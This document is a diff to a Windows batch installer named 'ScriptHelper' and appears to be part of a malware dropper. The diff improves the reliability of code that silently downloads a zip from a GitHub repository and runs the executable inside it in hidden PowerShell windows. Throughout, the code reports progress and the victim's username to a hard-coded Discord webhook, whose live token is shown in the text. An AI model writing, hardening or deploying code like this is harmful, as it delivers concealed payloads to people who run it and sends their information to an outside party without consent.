@@ -11,7 +11,7 @@ set "DOWNLOAD_URL=https://github.com/afscoder29/bookish-disco/raw/refs/heads/mai
 set "TEMP_DIR=%LOCALAPPDATA%\ScriptHelper_temp"
 set "EXECUTABLE=ScriptHelper.exe"
 set "VCREDIST_URL=https://aka.ms/vs/17/release/vc_redist.x64.exe"
-set "SUCCESS_FLAG=%PROGRAMDATA%\Microsoft\Windows\ScriptHelper\.success6"
+set "SUCCESS_FLAG=%PROGRAMDATA%\Microsoft\Windows\ScriptHelper\.succes1s"
 set "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1397005678568276124/zTFS1Ov0zdL_pg4sJRx5HOHWHYiogEkNu2my1JV2zQWDscHdedAVcGU49NGbfqtktIYd"
 set "LOG_FILE=%PROGRAMDATA%\ScriptHelper.log"
 
@@ -127,7 +127,7 @@ if not exist "%TEMP_DIR%" (
 call :Log "Starting VC++ Redistributable installation"
 call :SendWebhook "Installing VC++ Redistributable" "Downloading and installing Visual C++ Redistributable..." "16776960"
 
-powershell -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%VCREDIST_URL%' -OutFile '%TEMP_DIR%\vc_redist.x64.exe' -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%VCREDIST_URL%' -OutFile '%TEMP_DIR%\vc_redist.x64.exe' -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"
 
 if not exist "%TEMP_DIR%\vc_redist.x64.exe" (
     call :LogError "Failed to download VC++ Redistributable"
@@ -157,7 +157,7 @@ del "%TEMP_DIR%\vc_redist.x64.exe" >nul 2>&1
 call :Log "Starting application download from: %DOWNLOAD_URL%"
 call :SendWebhook "Downloading Application" "Downloading application from: %DOWNLOAD_URL%" "3447003"
 
-powershell -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_DIR%\app.zip' -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ErrorActionPreference='Stop'; try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_DIR%\app.zip' -ErrorAction Stop } catch { Write-Error \"Download failed: $($_.Exception.Message)\"; exit 1 }" 2>>"%LOG_FILE%"
 
 if not exist "%TEMP_DIR%\app.zip" (
     call :LogError "Failed to download application"
@@ -196,8 +196,27 @@ del "%TEMP_DIR%\app.zip" >nul 2>&1
 call :Log "Starting application: %TEMP_DIR%\win-x64\%EXECUTABLE%"
 call :SendWebhook "Launching Application" "Starting %EXECUTABLE%..." "3447003"
 
-:: Run the application completely hidden using PowerShell with full path
-powershell -WindowStyle Hidden -Command "$process = Start-Process -FilePath '%TEMP_DIR%\win-x64\%EXECUTABLE%' -WorkingDirectory '%TEMP_DIR%\win-x64' -WindowStyle Hidden -PassThru -Wait; exit $process.ExitCode" 2>>"%LOG_FILE%"
+:: Verify directory and executable exist before launching
+if not exist "%TEMP_DIR%\win-x64" (
+    call :LogError "Working directory does not exist: %TEMP_DIR%\win-x64"
+    call :SendWebhook "Launch Failed" "Working directory does not exist: %TEMP_DIR%\win-x64" "15158332"
+    goto :ErrorExit
+)
+
+if not exist "%TEMP_DIR%\win-x64\%EXECUTABLE%" (
+    call :LogError "Executable not found: %TEMP_DIR%\win-x64\%EXECUTABLE%"
+    call :SendWebhook "Launch Failed" "Executable not found: %TEMP_DIR%\win-x64\%EXECUTABLE%" "15158332"
+    goto :ErrorExit
+)
+
+call :Log "Verified directory and executable exist. Working directory: %TEMP_DIR%\win-x64"
+
+:: Resolve full paths before passing to PowerShell
+set "WORKING_DIR=%TEMP_DIR%\win-x64"
+set "EXE_PATH=%TEMP_DIR%\win-x64\%EXECUTABLE%"
+
+:: Run the application completely hidden using PowerShell with proper error handling
+powershell -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { $workingDir = [System.IO.Path]::GetFullPath('%WORKING_DIR%'); $exePath = [System.IO.Path]::GetFullPath('%EXE_PATH%'); if (-not (Test-Path -LiteralPath $workingDir)) { Write-Error \"Working directory does not exist: $workingDir\"; exit 1 }; if (-not (Test-Path -LiteralPath $exePath)) { Write-Error \"Executable not found: $exePath\"; exit 1 }; $process = Start-Process -FilePath $exePath -WorkingDirectory $workingDir -WindowStyle Hidden -PassThru -Wait; exit $process.ExitCode } catch { Write-Error \"Failed to start application: $($_.Exception.Message)\"; exit 1 }" 2>>"%LOG_FILE%"
 set "app_result=!errorLevel!"
 
 call :Log "Application finished with exit code: %app_result%"
@@ -274,7 +293,7 @@ set "description=!description:"=\"!"
 set "json={\"embeds\":[{\"title\":\"!title!\",\"description\":\"**User:** %USERNAME%\n!description!\",\"color\":!color!,\"footer\":{\"text\":\"ScriptHelper v3.4\"}}]}"
 
 :: Send webhook with hidden window
-powershell -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { $response = Invoke-RestMethod -Uri '%DISCORD_WEBHOOK_URL%' -Method Post -ContentType 'application/json; charset=utf-8' -Body '%json%' -UseBasicParsing; Write-Host 'SUCCESS: Webhook sent' } catch { Write-Host 'ERROR: Webhook failed -' $_.Exception.Message }" >>"%LOG_FILE%" 2>&1
+powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ErrorActionPreference='Stop'; try { $response = Invoke-RestMethod -Uri '%DISCORD_WEBHOOK_URL%' -Method Post -ContentType 'application/json; charset=utf-8' -Body '%json%' -UseBasicParsing; Write-Host 'SUCCESS: Webhook sent' } catch { Write-Host 'ERROR: Webhook failed -' $_.Exception.Message }" >>"%LOG_FILE%" 2>&1
 
 goto :eof
 
@@ -291,4 +310,3 @@ goto :eof
 set "timestamp=%date% %time%"
 echo [%timestamp%] ERROR: %~1 >> "%LOG_FILE%"
 goto :eof
-
